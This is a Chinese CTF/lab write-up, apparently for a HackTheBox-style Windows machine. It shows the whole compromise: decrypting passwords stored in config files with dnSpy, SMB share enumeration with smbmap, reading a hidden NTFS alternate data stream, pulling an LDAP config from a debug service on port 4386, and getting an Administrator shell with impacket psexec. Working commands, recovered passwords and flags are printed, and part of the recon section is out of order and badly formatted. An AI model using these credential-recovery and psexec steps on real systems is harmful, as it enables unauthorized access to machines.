
```vbnet
Module Module1
Sub Main()
Dim Config As ConfigFile = ConfigFile.LoadFromFile("RU_Config.xml")
Dim test As New SsoIntegration With {.Username = Config.Username, .Password = Utils.DecryptString(Config.Password)}
Console.WriteLine(Utils.DecryptString(Config.Password))
End Sub
End Module
```

结果也输出了：

![image](upload/attach/202301/784203_KM4N3SNSRZCQUQM.png)

获得了一个新的密码 `xRxRxPANCAK3SxRxRx`

但是还有另外一种简单的思路，就是直接从 EXE 入手，在了解完代码之后，知道他只是没有打印这个输出，最终的结果肯定要停留在系统的某个地方。

### dnspy

既然是 C# 的代码，直接用 `dnspy` 反编译 exe 即可。

![image](upload/attach/202301/784203_FRDJ6QHYQ7N56K5.png)

思路就是，从这里开始调用解密算法然后输出结果，那么我们可以在

```csharp
ssoIntegration.Password = Utils.DecryptString(configFile.Password);
```

这一行给他打上断点，让他执行到这里然后断开，然后查看寄存器。

`F9` 打下断点之后，开始执行程序。

![image](upload/attach/202301/784203_EZ9RZ9YVCCXJ3SM.png)

断点之后，可以看到在内存中的 `password` 参数就是配置文件中的密码，此处还没有进行解密，需要让他再执行一步。

单步执行 `F11` 可以看到解密是怎么执行的，逐过程 `F10` 就是单步执行，就会看到解密完成的密码存在了内存里面。

![image](upload/attach/202301/784203_M3S44DBHKW3DRAQ.png)

也可以获得密码

## user

接上一步获得了 `C.smith` 的密码之后 使用 SMB 去连接

```bash
└─# smbmap -H 10.129.157.43 -u C.Smith -p xRxRxPANCAK3SxRxRx //查看共享
[+] IP: 10.129.157.43:445 Name: 10.129.157.43
Disk Permissions Comment
---- ----------- -------
ADMIN$ NO ACCESS Remote Admin
C$ NO ACCESS Default share
Data READ ONLY
IPC$ NO ACCESS Remote IPC
Secure$ READ ONLY
Users READ ONLY
```

直接去访问自己名字文件下面的文件，获得了第一个 flag。

![image](upload/attach/202301/784203_CYABWBJMPSX6Z54.png)

## ROOT

我继续搜索这台机器的文件，发现了一个 txt 文件

![image](upload/attach/202301/784203_C45WJ8MCG7NT8JQ.png)

但是很奇怪的是 0 字节。

而另外一份配置文件是一个导出的备份配置。

![image](upload/attach/202301/784203_WNDPACJJPFTFDB4.png)

`4386` 端口。。。。刚开始 `nmap` 扫描的不就是 `4386` 端口吗，猜想这里的信息应该和另外一个端口有关。

![image](upload/attach/202301/784203_RF2EB74NVWBTQFD.png)

同时，另外一个目录存在一个 `HqkLdap.exe`。

用 Windows 打开 `Hqkldap.exe` 试试。

```powershell
zhangsan  Release  ♥ 14:48  .\HqkLdap.exe
Invalid number of command line arguments
zhangsan  Release  ♥ 14:48  .\HqkLdap.exe -help
Specified config file does not exist
zhangsan  Release  ♥ 14:48  .\HqkLdap.exe help
Specified config file does not exist
```

获得了两个提示。

1.命令行参数的数量无效

2.指定的配置文件不存在

说明运行这个程序 需要带配置文件

我想到用刚刚那个 0 字节的文件尝试一下

![image](upload/attach/202301/784203_6V4UUV3SURU5RWE.png)

第三个报错，请确保安装了可选的数据库导入模块。

发现也是 C# 编译的，丢入 `dnspy` 看看

### dnspy

![image](upload/attach/202301/784203_3WJ8HD29AYC662N.png)

反编译之后，发现其中有如下提示：

除了之前提到的几个问题之外，还要有一个 `HqkDbImport.exe`

但是目前缺少配置文件和这个 exe 文件。

### CTF NTFS

在我思考为什么 txt 是 0 字节的文件时候，搜索隐写的时候发现了一种叫 NTFS 数据流隐写的技术。

```text
NTFS交换数据流（alternate data streams，简称ADS）是NTFS磁盘格式的一个特性，在NTFS文件系统下每一个文件，都有着主文件流和非主文件流，主文件流能够直接看到；而非主文件流寄宿于主文件流中，无法直接读取，这个非主文件流就是NTFS交换数据流。交换数据流的诞生源于Windows系统与苹果的HFS系统的交互需求，NTFS使用交换数据流来存储文件相关元数据等等。
ADS的作用在于，它允许一个文件携带着附加的信息。例如，IE浏览器下载文件时，会向文件添加一个数据流，标记该文件来源于外部，即带有风险，那么，在用户打开文件时，就会弹出文件警告提示。再如，在网址收藏中，也会附加一个favicon数据流以存放网站图标。
创建一个数据交换流文件的方法很简单，只需要这样一条命令：
type "要隐藏的附加文件">"宿主文件":"要隐藏的附加文件"
例如在这道题目中，我就是用这样一条命令向ADS中写入了图像文件：
type "flag.gif" > "nothing.gif":"flag.gif"
此时需要注意，尽管可以向文本/图像/可执行文件等各类文件类型的ADS中写入数据，但最好保持宿主文件和附加文件文件类型的一致性。我第一次尝试是向png附加gif，结果测试发现这种隐写不够隐蔽，可以直接被foremost察觉并分离…
```

参考文章：<mark class="encrypted">d90K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6B7L8$3&6W2M7U0p5I4x3U0x3@1i4K6u0W2k6$3W2@1K9s2g2T1i4K6u0W2K9h3!0Q4x3V1k6S2M7Y4c8A6j5$3I4W2i4K6u0r3z5o6f1K6y4e0N6V1z5r3c8Q4x3X3g2Z5N6r3#2D9</mark>

参考文章：<mark class="encrypted">74cK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2U0L8X3u0D9L8$3N6K6i4K6u0W2j5$3!0E0i4K6u0r3L8r3W2F1N6i4S2K6k6h3y4Q4x3V1k6S2M7Y4c8A6j5$3I4W2M7#2)9J5c8U0p5H3y4o6t1K6x3e0x3^5i4K6u0W2K9s2c8E0L8l9```.</mark>

当我想到这里的的时候，用 `allinfo` 列出那个空的文件后，奇迹发生了。

```bash
smb: \C.Smith\HQK Reporting\> allinfo "Debug Mode Password.txt"
altname: DEBUGM~1.TXT
create_time: 四 8月 8 19时06分12秒 2019 EDT
access_time: 四 8月 8 19时06分12秒 2019 EDT
write_time: 四 8月 8 19时08分17秒 2019 EDT
change_time: 三 7月 21 14时47分12秒 2021 EDT
attributes: A (20)
stream: [::$DATA], 0 bytes
stream: [:Password:$DATA], 15 bytes
smb: \C.Smith\HQK Reporting\>
```

![image](upload/attach/202301/784203_MEZV23ZXYQ3GCCK.png)

获得了一个带隐写的流文件。按照文章的说法，带上 `password` 去访问。

带上密码再去下载文件
`get *"&quot;Debug Mode Password.txt:Password&quot;*`

![image](upload/attach/202301/784203_G2JDPB86EJZZRHZ.png)

获得了最后一个密码，`WBQ201953D8w`。

那么，现在有密码了，有 EXE 了，只差配置文件了，别忘了之前的 `4386` 端口。

使用 `telnet` 连接一下

![image](upload/attach/202301/784203_KTYEJ94Y6XUHUT7.png)

这里执行命令，输入你获得的调试密码。

![image](upload/attach/202301/784203_E4RVFVK2CM3VV6S.png)

然后 `help` 查看帮助

`setdir` 到上级目录后会发现刚开始在 SMB 里面发现的 `config`。

```
>setdir LDAP
Current directory set to LDAP
>list
Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command
QUERY FILES IN CURRENT DIRECTORY
[1] HqkLdap.exe
[2] Ldap.conf
Current Directory: LDAP
```

最终找到了该配置文件

![image](upload/attach/202301/784203_Y4NMBMUZH4CQ5KC.png)

```ini
Domain=nest.local
Port=389
BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
User=Administrator
Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
```

获得了配置文件后，回到我们刚开始做 exe 分析那里。

### 逆向

要素都齐活了

1.配置文件
2.主 EXE
3.`HqkDbImport.exe`（缺少）

但是我还是没有找到 `HqkDbImport.exe` 在哪里，没有就给他编一个看看行不行，用 TXT 改一个后缀用。

![image](upload/attach/202301/784203_8SVVVUX7ZBSCXJ7.png)

![image](upload/attach/202301/784203_HE2NEYQ969V75QA.png)

看代码

此处是解密流程中分别对应的参数。

![image](upload/attach/202301/784203_D35QSFEEJTVDWA7.png)

那么断点应该打在解密完成后的下一步，即 `Ldap ldap = new Ldap();`

![image](upload/attach/202301/784203_BHJ5R94YUXAN43N.png)

`F10` 单步走

走到 `username`，解密结果为 `administrator`

![image](upload/attach/202301/784203_XAREE8E2NTG379B.png)

![image](upload/attach/202301/784203_N6NS2DWYGZWQW7Z.png)

`HqkLdap.LdapSearchSettings.Password.get` 返回 `"XtH4nkS4Pl4y1nGX"` string

获得密码

![图片描述](upload/attach/202301/784203_FKS4S4J52BNFQ2A.png)

获得域名。

### PWN ROOT

```bash
─# smbmap -H 10.129.157.43 -u Administrator -p XtH4nkS4Pl4y1nGX
[+] IP: 10.129.157.43:445 Name: 10.129.157.43
Disk Permissions Comment
---- ----------- -------
ADMIN$ READ, WRITE Remote Admin
C$ READ, WRITE Default share
Data READ, WRITE
IPC$ NO ACCESS Remote IPC
Secure$ READ, WRITE
Users READ, WRITE
```

直接使用 `psexec` 去连接就行。

```bash
└─# python3 psexec.py administrator:XtH4nkS4Pl4y1nGX@10.129.157.43
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Requesting shares on 10.129.157.43.....
[*] Found writable share ADMIN$
[*] Uploading file oMaWJKuG.exe
[*] Opening SVCManager on 10.129.157.43.....
[*] Creating service zVQM on 10.129.157.43.....
[*] Starting service zVQM.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.
C:\Windows\system32> cd C:\Users\Administrator\Desktop
C:\Users\Administrator\Desktop> ls
'ls' is not recognized as an internal or external command,
operable program or batch file.
C:\Users\Administrator\Desktop> dir
Volume in drive C has no label.
Volume Serial Number is E6FB-F2E9
Directory of C:\Users\Administrator\Desktop
07/21/2021 06:27 PM <DIR> .
07/21/2021 06:27 PM <DIR> ..
12/21/2022 03:27 AM 34 root.txt
1 File(s) 34 bytes
2 Dir(s) 7,534,895,104 bytes free
C:\Users\Administrator\Desktop> type root.txt
ca6dc99e9e052aa9fc3a68ea7c14ab9b
```

## 信息收集

|  |  |

| --- | --- |

| 1  2  3  4  5  6  7  8  9 | `└─``# nmap -sV 10.129.157.43 -p 1-65535`  `Starting Nmap` `7.93` `( https:``/``/``nmap.org ) at` `2022``-``12``-``20` `22``:``27` `EST`  `Nmap scan report` `for` `10.129``.``157.43`  `Host` `is` `up (``0.27s` `latency).`  `Not shown:` `65533` `filtered tcp ports (no``-``response)`  `PORT     STATE SERVICE       VERSION`  `445``/``tcp` `open`  `microsoft``-``ds?`  `4386``/``tcp` `open`  `unknown`  `1` `service unrecognized despite returning data. If you know the service``/``version, please submit the following fingerprint at https:``/``/``nmap.org``/``cgi``-``bin``/``submit.cgi?new``-``service :` |

获得了 `445` 和 `4386` 的未知服务。

### SMB 共享

查看 `445` 端口共享了什么服务。

|  |  |

| --- | --- |
